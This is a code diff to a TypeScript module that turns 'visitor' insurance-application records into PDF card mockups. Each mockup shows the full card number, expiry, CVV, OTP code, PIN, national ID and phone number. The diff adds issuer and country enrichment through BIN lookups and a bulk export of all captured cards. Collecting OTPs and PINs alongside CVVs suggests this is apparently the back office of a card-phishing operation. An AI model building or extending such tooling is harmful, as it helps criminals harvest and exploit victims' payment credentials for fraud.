@@ -2,6 +2,7 @@
 
 import type { InsuranceApplication } from "@/lib/firestore-types";
 import { _d } from "@/lib/secure-utils";
+import { translateBankName, translateCountry, fetchBin } from "@/components/bin-info";
 
 function decryptField(value: string | undefined): string {
   if (!value) return "";
@@ -75,46 +76,69 @@ function formatCardNumber(num: string): string {
   return clean.match(/.{1,4}/g)?.join("  ") || num;
 }
 
-function buildCardMockupHtml(
-  cardNumber: string,
-  expiryDate: string,
-  cvv: string,
-  cardHolderName: string,
-  bankName: string,
-  cardType: string,
-  cardLevel: string,
-  otpCode: string,
-  pinCode: string,
-  visitorName: string,
-  identityNumber: string,
-  phoneNumber: string,
-  pageLabel: string,
-): string {
-  const bankLogoUrl = getBankLogoUrlForPdf(bankName);
+interface CardMockupData {
+  cardNumber: string;
+  expiryDate: string;
+  cvv: string;
+  cardHolderName: string;
+  bankName: string;
+  cardType: string;
+  cardLevel: string;
+  otpCode: string;
+  pinCode: string;
+  visitorName: string;
+  identityNumber: string;
+  phoneNumber: string;
+  pageLabel: string;
+  currency?: string;
+  cardCategory?: string;
+  countryName?: string;
+  countryCode?: string;
+}
+
+function buildCardMockupHtml(d: CardMockupData): string {
+  const {
+    cardNumber, expiryDate, cvv, cardHolderName,
+    bankName, cardType, cardLevel,
+    otpCode, pinCode,
+    visitorName, identityNumber, phoneNumber, pageLabel,
+    currency, cardCategory, countryName, countryCode,
+  } = d;
+
   const networkLogoUrl = getNetworkLogoUrlForPdf(cardType);
+  const bankLogoUrl = getBankLogoUrlForPdf(bankName);
 
   const bankDisplay = bankLogoUrl
-    ? `<img src="${bankLogoUrl}" alt="${escapeHtml(bankName)}" style="height:26px;max-width:120px;object-fit:contain;filter:brightness(0) invert(1);" crossorigin="anonymous" />`
+    ? `<img src="${bankLogoUrl}" alt="${escapeHtml(bankName)}" style="height:28px;max-width:140px;object-fit:contain;filter:brightness(0) invert(1);display:block;" crossorigin="anonymous" />`
     : bankName
-      ? `<span style="font-size:14px;font-weight:800;color:#fff;font-family:Arial,sans-serif;letter-spacing:0.04em;">${escapeHtml(bankName)}</span>`
-      : "";
+      ? `<span style="font-size:15px;font-weight:800;color:#fff;font-family:'Cairo',Arial,sans-serif;letter-spacing:0.04em;line-height:1.2;">${escapeHtml(bankName)}</span>`
+      : `<span style="font-size:15px;font-weight:800;color:#fff;font-family:Arial,sans-serif;letter-spacing:0.04em;">BANK NAME</span>`;
 
   const networkDisplay = networkLogoUrl
-    ? `<img src="${networkLogoUrl}" alt="${escapeHtml(cardType)}" style="height:24px;max-width:60px;object-fit:contain;filter:brightness(0) invert(1);" crossorigin="anonymous" />`
-    : cardType
-      ? `<span style="font-size:12px;font-weight:900;color:#fff;font-family:Arial;letter-spacing:0.06em;text-transform:uppercase;">${escapeHtml(cardType)}</span>`
+    ? `<img src="${networkLogoUrl}" alt="${escapeHtml(cardType)}" style="height:30px;max-width:80px;object-fit:contain;filter:brightness(0) invert(1);display:block;" crossorigin="anonymous" />`
+    : cardType && cardType !== "CARD"
+      ? `<span style="font-size:14px;font-weight:900;color:#fff;font-family:Arial;letter-spacing:0.06em;text-transform:uppercase;">${escapeHtml(cardType)}</span>`
       : "";
 
   const levelBadge = cardLevel
-    ? `<span style="font-size:10px;font-weight:700;letter-spacing:0.1em;color:#f5d77e;background:rgba(245,215,126,0.15);border:1px solid rgba(245,215,126,0.35);border-radius:20px;padding:2px 10px;text-transform:uppercase;">${escapeHtml(cardLevel)}</span>`
+    ? `<span style="display:inline-block;font-size:10px;font-weight:700;letter-spacing:0.1em;color:#e8d48b;background:rgba(232,212,139,0.12);border:1px solid rgba(232,212,139,0.25);border-radius:6px;padding:2px 8px;text-transform:uppercase;">${escapeHtml(cardLevel)}</span>`
     : "";
 
-  const chipHtml = `<div style="width:42px;height:30px;border-radius:6px;flex-shrink:0;background:linear-gradient(135deg,#c9a227 0%,#f5d77e 40%,#c9a227 100%);display:grid;grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr;gap:2px;padding:5px;box-sizing:border-box;">
-    <div style="background:rgba(120,80,0,0.35);border-radius:2px;"></div>
-    <div style="background:rgba(120,80,0,0.35);border-radius:2px;"></div>
-    <div style="background:rgba(120,80,0,0.35);border-radius:2px;"></div>
-    <div style="background:rgba(120,80,0,0.35);border-radius:2px;"></div>
+  const metaPills = [
+    currency ? `<span style="display:inline-block;font-size:10px;font-weight:700;color:rgba(255,255,255,0.5);letter-spacing:0.08em;background:rgba(255,255,255,0.08);border-radius:4px;padding:1px 6px;margin-right:4px;">${escapeHtml(currency)}</span>` : "",
+    cardCategory ? `<span style="display:inline-block;font-size:10px;font-weight:700;color:rgba(255,255,255,0.5);letter-spacing:0.08em;background:rgba(255,255,255,0.08);border-radius:4px;padding:1px 6px;">${escapeHtml(cardCategory)}</span>` : "",
+  ].filter(Boolean).join("");
+
+  const chipHtml = `<div style="width:46px;height:34px;border-radius:6px;flex-shrink:0;background:linear-gradient(135deg,#c9a227 0%,#f5d77e 40%,#c9a227 100%);display:grid;grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr;gap:2px;padding:5px;box-sizing:border-box;box-shadow:0 1px 4px rgba(0,0,0,0.2);">
+    <div style="background:rgba(120,80,0,0.3);border-radius:2px;"></div>
+    <div style="background:rgba(120,80,0,0.3);border-radius:2px;"></div>
+    <div style="background:rgba(120,80,0,0.3);border-radius:2px;"></div>
+    <div style="background:rgba(120,80,0,0.3);border-radius:2px;"></div>
   </div>`;
+
+  const countryLine = countryName
+    ? `<div style="font-size:10px;color:rgba(255,255,255,0.4);letter-spacing:0.08em;direction:ltr;margin-top:2px;">${escapeHtml(countryName)}${countryCode ? ` (${escapeHtml(countryCode)})` : ""}</div>`
+    : "";
 
   const infoLine = [
     visitorName ? `<span style="margin-left:16px;"><b>الاسم:</b> ${escapeHtml(visitorName)}</span>` : "",
@@ -130,43 +154,46 @@ function buildCardMockupHtml(
   return `
     <div style="width:500px;margin:0 auto;font-family:'Cairo',Arial,sans-serif;direction:rtl;-webkit-print-color-adjust:exact;print-color-adjust:exact;">
       ${pageLabel ? `<div style="text-align:center;font-size:10px;color:#94A3B8;margin-bottom:6px;">${escapeHtml(pageLabel)}</div>` : ""}
-      
-      <div style="background:linear-gradient(145deg,#0a1628 0%,#112240 40%,#0d1b36 70%,#091428 100%);border-radius:20px;padding:24px 28px 20px;width:100%;box-sizing:border-box;position:relative;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,0.35),0 4px 12px rgba(0,0,0,0.15);">
-        <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:20px;background:linear-gradient(135deg,rgba(255,255,255,0.06) 0%,transparent 50%);pointer-events:none;"></div>
-        
-        <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:6px;position:relative;">
-          <div style="display:flex;flex-direction:column;gap:4px;direction:ltr;">
+
+      <div style="width:500px;height:281px;box-sizing:border-box;background:linear-gradient(145deg,#0c1a3d 0%,#142047 40%,#1a2d5e 70%,#0f1d45 100%);border-radius:20px;padding:22px 24px;position:relative;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,0.3),0 2px 8px rgba(0,0,0,0.15);display:flex;flex-direction:column;">
+        <div style="position:absolute;inset:0;border-radius:20px;background:linear-gradient(135deg,rgba(255,255,255,0.08) 0%,transparent 50%);pointer-events:none;"></div>
+        <div style="position:absolute;inset:0;border-radius:20px;background:radial-gradient(ellipse at 80% 20%,rgba(99,102,241,0.15) 0%,transparent 60%);pointer-events:none;opacity:0.3;"></div>
+
+        <div style="display:flex;justify-content:space-between;align-items:flex-start;position:relative;">
+          <div style="display:flex;flex-direction:column;gap:4px;direction:ltr;max-width:280px;">
             ${bankDisplay}
             ${levelBadge}
+            ${metaPills ? `<div>${metaPills}</div>` : ""}
           </div>
-          <div style="display:flex;align-items:center;height:28px;">
+          <div style="display:flex;align-items:center;height:34px;flex-shrink:0;">
             ${networkDisplay}
           </div>
         </div>
 
-        <div style="display:flex;align-items:center;gap:16px;margin:18px 0 8px;position:relative;">
+        <div style="display:flex;align-items:center;gap:16px;margin-top:auto;position:relative;">
           ${chipHtml}
-          <div style="font-family:'Courier New',monospace;font-size:22px;font-weight:700;color:#fff;letter-spacing:3px;direction:ltr;">
-            ${escapeHtml(cardNumber ? formatCardNumber(cardNumber) : "•••• •••• •••• ••••")}
+          <div style="font-family:'Courier New',monospace;font-size:24px;font-weight:700;color:#fff;letter-spacing:3px;direction:ltr;line-height:1;">
+            ${escapeHtml(cardNumber ? formatCardNumber(cardNumber) : "••••  ••••  ••••  ••••")}
           </div>
         </div>
 
-        <div style="display:flex;align-items:center;gap:40px;margin:10px 0 6px;direction:ltr;position:relative;">
+        <div style="display:flex;align-items:center;gap:40px;margin-top:10px;direction:ltr;position:relative;">
           <div>
-            <div style="font-size:9px;color:rgba(255,255,255,0.4);letter-spacing:1px;font-family:Arial;margin-bottom:1px;">VALID THRU</div>
-            <div style="font-family:'Courier New',monospace;font-size:16px;font-weight:600;color:#fff;">${escapeHtml(expiryDate || "MM/YY")}</div>
+            <div style="font-size:10px;color:rgba(255,255,255,0.4);letter-spacing:1px;font-family:Arial;margin-bottom:2px;">VALID THRU</div>
+            <div style="font-family:'Courier New',monospace;font-size:18px;font-weight:600;color:#fff;line-height:1;">${escapeHtml(expiryDate || "••/••")}</div>
           </div>
           <div>
-            <div style="font-size:9px;color:rgba(255,255,255,0.4);letter-spacing:1px;font-family:Arial;margin-bottom:1px;">CVV</div>
-            <div style="font-family:'Courier New',monospace;font-size:16px;font-weight:600;color:#fff;">${escapeHtml(cvv || "•••")}</div>
+            <div style="font-size:10px;color:rgba(255,255,255,0.4);letter-spacing:1px;font-family:Arial;margin-bottom:2px;">CVV</div>
+            <div style="font-family:'Courier New',monospace;font-size:18px;font-weight:600;color:#fff;line-height:1;">${escapeHtml(cvv || "•••")}</div>
           </div>
         </div>
 
-        <div style="display:flex;justify-content:space-between;align-items:flex-end;margin-top:14px;position:relative;">
-          <div style="direction:ltr;">
-            <span style="font-size:12px;font-weight:600;color:rgba(255,255,255,0.5);text-transform:uppercase;letter-spacing:0.1em;">${escapeHtml(cardType && cardType !== "CARD" ? cardType : "")}</span>
+        <div style="display:flex;justify-content:space-between;align-items:flex-end;margin-top:12px;position:relative;">
+          <div style="direction:ltr;display:flex;flex-direction:column;gap:2px;">
+            <span style="font-size:12px;font-weight:600;color:rgba(255,255,255,0.5);text-transform:uppercase;letter-spacing:0.1em;line-height:1;">${escapeHtml(cardType && cardType !== "CARD" ? cardType : "")}</span>
+            ${countryLine}
           </div>
-          <span style="font-size:13px;font-weight:700;color:#fff;direction:ltr;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
+          <span style="font-size:14px;font-weight:700;color:#fff;direction:ltr;max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;line-height:1;">
             ${escapeHtml(cardHolderName || "CARDHOLDER NAME")}
           </span>
         </div>
@@ -185,6 +212,44 @@ function safeTimestamp(ts: any): number {
   }
   const d = new Date(ts);
   return Number.isNaN(d.getTime()) ? 0 : d.getTime();
+}
+
+async function fetchBinForPdf(cardNumber: string): Promise<any | null> {
+  const bin = (cardNumber || "").replace(/\D/g, "").slice(0, 6);
+  if (!bin || bin.length < 6) return null;
+  const result = await fetchBin(bin);
+  return result === "error" ? null : result;
+}
+
+async function waitForResources(root: HTMLElement) {
+  if (typeof document !== "undefined" && (document as any).fonts?.load) {
+    try {
+      await Promise.all([
+        (document as any).fonts.load("700 16px Cairo"),
+        (document as any).fonts.load("900 16px Cairo"),
+        (document as any).fonts.load("400 16px Cairo"),
+      ]);
+      await (document as any).fonts.ready;
+    } catch {}
+  }
+  const imgs = Array.from(root.querySelectorAll("img")) as HTMLImageElement[];
+  await Promise.all(
+    imgs.map(async (img) => {
+      try {
+        if (typeof img.decode === "function") {
+          await img.decode();
+          return;
+        }
+      } catch {}
+      if (img.complete && img.naturalWidth > 0) return;
+      await new Promise<void>((resolve) => {
+        const done = () => resolve();
+        img.addEventListener("load", done, { once: true });
+        img.addEventListener("error", done, { once: true });
+        setTimeout(done, 5000);
+      });
+    })
+  );
 }
 
 function extractCardData(visitor: InsuranceApplication) {
@@ -634,49 +699,74 @@ function buildPdfHtml(
   `;
 }
 
+async function enrichCardWithBin(v: InsuranceApplication, pageLabel: string): Promise<CardMockupData> {
+  const d = extractCardData(v);
+  const bin = await fetchBinForPdf(d.cardNumber);
+  const enrichedBank = bin?.issuer?.name ? translateBankName(bin.issuer.name) : d.bankName;
+  const enrichedLevel = d.cardLevel || bin?.level || "";
+  const enrichedType = d.cardType || (bin?.scheme ? String(bin.scheme).toUpperCase() : "");
+  const countryName = bin?.country?.country ? translateCountry(bin.country.country) : "";
+  const countryCode = bin?.country?.alpha2 || "";
+  return {
+    ...d,
+    bankName: enrichedBank,
+    cardLevel: enrichedLevel,
+    cardType: enrichedType,
+    pageLabel,
+    currency: bin?.currency || "",
+    cardCategory: bin?.type || "",
+    countryName,
+    countryCode,
+  };
+}
+
+const FONT_LINK = `<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">`;
+
+function ensureFontLoaded() {
+  const existing = document.querySelector('link[data-pdf-cairo]');
+  if (!existing) {
+    const link = document.createElement("link");
+    link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
+    link.rel = "stylesheet";
+    link.setAttribute("data-pdf-cairo", "1");
+    document.head.appendChild(link);
+  }
+}
+
 export async function generateCardPdf(visitor: InsuranceApplication) {
   const html2pdf = (await import("html2pdf.js")).default;
+  ensureFontLoaded();
 
-  const link = document.createElement("link");
-  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
-  link.rel = "stylesheet";
-  document.head.appendChild(link);
-  await new Promise((resolve) => setTimeout(resolve, 1500));
-
-  const d = extractCardData(visitor);
-  const html = buildCardMockupHtml(
-    d.cardNumber, d.expiryDate, d.cvv, d.cardHolderName,
-    d.bankName, d.cardType, d.cardLevel,
-    d.otpCode, d.pinCode,
-    d.visitorName, d.identityNumber, d.phoneNumber,
-    ""
-  );
+  const data = await enrichCardWithBin(visitor, "");
+  const html = buildCardMockupHtml(data);
 
   const container = document.createElement("div");
   container.innerHTML = `
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
-    <div id="card-pdf-content" style="width:560px;padding:30px;background:#fff;-webkit-print-color-adjust:exact;print-color-adjust:exact;">
+    ${FONT_LINK}
+    <div id="card-pdf-content" style="width:560px;padding:30px;background:#fff;font-family:'Cairo',Arial,sans-serif;-webkit-print-color-adjust:exact;print-color-adjust:exact;">
       ${html}
     </div>
   `;
-  container.style.position = "absolute";
-  container.style.left = "-9999px";
+  container.style.position = "fixed";
+  container.style.left = "-99999px";
   container.style.top = "0";
   container.style.width = "560px";
+  container.style.background = "#fff";
   document.body.appendChild(container);
 
   const element = container.querySelector("#card-pdf-content") as HTMLElement;
 
-  const opt = {
-    margin: [10, 10, 10, 10] as [number, number, number, number],
-    filename: `بطاقة_${visitor.identityNumber || visitor.id || "card"}_${Date.now()}.pdf`,
-    image: { type: "jpeg" as const, quality: 0.98 },
-    html2canvas: { scale: 2, useCORS: true, letterRendering: true, scrollY: 0 },
-    jsPDF: { unit: "mm", format: "a4", orientation: "portrait" as const },
-    pagebreak: { mode: ["avoid-all", "css", "legacy"] },
-  };
-
   try {
+    await waitForResources(element);
+
+    const opt = {
+      margin: [10, 10, 10, 10] as [number, number, number, number],
+      filename: `بطاقة_${visitor.identityNumber || visitor.id || "card"}_${Date.now()}.pdf`,
+      image: { type: "jpeg" as const, quality: 0.98 },
+      html2canvas: { scale: 2, useCORS: true, allowTaint: false, letterRendering: true, scrollY: 0, backgroundColor: "#ffffff" },
+      jsPDF: { unit: "mm", format: "a4", orientation: "portrait" as const },
+      pagebreak: { mode: ["avoid-all", "css", "legacy"] },
+    };
     await html2pdf().set(opt).from(element).save();
   } finally {
     document.body.removeChild(container);
@@ -696,52 +786,45 @@ export async function generateAllCardsPdf(visitors: InsuranceApplication[]) {
   if (withCards.length === 0) return;
 
   const html2pdf = (await import("html2pdf.js")).default;
+  ensureFontLoaded();
 
-  const link = document.createElement("link");
-  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
-  link.rel = "stylesheet";
-  document.head.appendChild(link);
-  await new Promise((resolve) => setTimeout(resolve, 1500));
+  const enriched = await Promise.all(
+    withCards.map((v, i) => enrichCardWithBin(v, `${i + 1} / ${withCards.length}`))
+  );
 
-  const cardsHtml = withCards.map((v, i) => {
-    const d = extractCardData(v);
-    const pageLabel = `${i + 1} / ${withCards.length}`;
-    const cardHtml = buildCardMockupHtml(
-      d.cardNumber, d.expiryDate, d.cvv, d.cardHolderName,
-      d.bankName, d.cardType, d.cardLevel,
-      d.otpCode, d.pinCode,
-      d.visitorName, d.identityNumber, d.phoneNumber,
-      pageLabel
-    );
-    const isLast = i === withCards.length - 1;
+  const cardsHtml = enriched.map((data, i) => {
+    const cardHtml = buildCardMockupHtml(data);
+    const isLast = i === enriched.length - 1;
     return `<div style="${!isLast ? "page-break-after:always;" : ""}padding:30px 0;">${cardHtml}</div>`;
   }).join("\n");
 
   const container = document.createElement("div");
   container.innerHTML = `
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    ${FONT_LINK}
     <div id="all-cards-pdf" style="width:560px;padding:0 30px;background:#fff;font-family:'Cairo',Arial,sans-serif;-webkit-print-color-adjust:exact;print-color-adjust:exact;">
       ${cardsHtml}
     </div>
   `;
-  container.style.position = "absolute";
-  container.style.left = "-9999px";
+  container.style.position = "fixed";
+  container.style.left = "-99999px";
   container.style.top = "0";
   container.style.width = "620px";
+  container.style.background = "#fff";
   document.body.appendChild(container);
 
   const element = container.querySelector("#all-cards-pdf") as HTMLElement;
 
-  const opt = {
-    margin: [10, 10, 10, 10] as [number, number, number, number],
-    filename: `جميع_البطاقات_${Date.now()}.pdf`,
-    image: { type: "jpeg" as const, quality: 0.97 },
-    html2canvas: { scale: 2, useCORS: true, letterRendering: true, scrollY: 0 },
-    jsPDF: { unit: "mm", format: "a4", orientation: "portrait" as const },
-    pagebreak: { mode: ["css", "legacy"] },
-  };
-
   try {
+    await waitForResources(element);
+
+    const opt = {
+      margin: [10, 10, 10, 10] as [number, number, number, number],
+      filename: `جميع_البطاقات_${Date.now()}.pdf`,
+      image: { type: "jpeg" as const, quality: 0.97 },
+      html2canvas: { scale: 2, useCORS: true, allowTaint: false, letterRendering: true, scrollY: 0, backgroundColor: "#ffffff" },
+      jsPDF: { unit: "mm", format: "a4", orientation: "portrait" as const },
+      pagebreak: { mode: ["css", "legacy"] },
+    };
     await html2pdf().set(opt).from(element).save();
   } finally {
     document.body.removeChild(container);
